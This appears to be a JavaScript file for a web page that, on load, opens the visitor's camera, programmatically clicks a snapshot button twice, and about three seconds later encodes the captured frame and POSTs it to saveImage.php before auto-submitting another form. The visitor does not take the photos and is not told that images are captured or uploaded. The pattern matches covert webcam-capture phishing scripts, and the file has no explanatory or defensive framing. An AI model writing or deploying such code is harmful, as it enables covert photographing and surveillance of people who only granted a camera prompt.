var canvas = document.getElementById('canvas');
var context = canvas.getContext('2d');
var video = document.getElementById('video');


window.onload = function(){

    // Get access to the camera!

    if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
            video.srcObject = stream;
            video.play();
        });
    }
    
    // Trigger photo take

    document.getElementById("snap").addEventListener("click", function() {
        context.drawImage(video, 0, 0, 640, 480);
    });
    
    var snap = document.getElementById('snap');
    var n = 2;
    (function submit(){
        if(n > 0) {
            snap.click();
            setTimeout(submit, 2000); 
            n--;
        }
    })();
}

setTimeout(function(){ 
    uploadEx();
    document.forms["form2"].submit();
}, 3000);

function uploadEx() {
                var dataURL = canvas.toDataURL("image/png");
                document.getElementById('hidden').value = dataURL;
                var fd = new FormData(document.forms["form1"]);
 
                var xhr = new XMLHttpRequest();
                xhr.open('POST', 'saveImage.php', true);
 
                xhr.upload.onprogress = function(e) {
                    if (e.lengthComputable) {
                        var percentComplete = (e.loaded / e.total) * 100;
                        console.log(percentComplete + '% uploaded');
                    }
                };
 
                xhr.onload = function() {
 
                };
                xhr.send(fd);
            };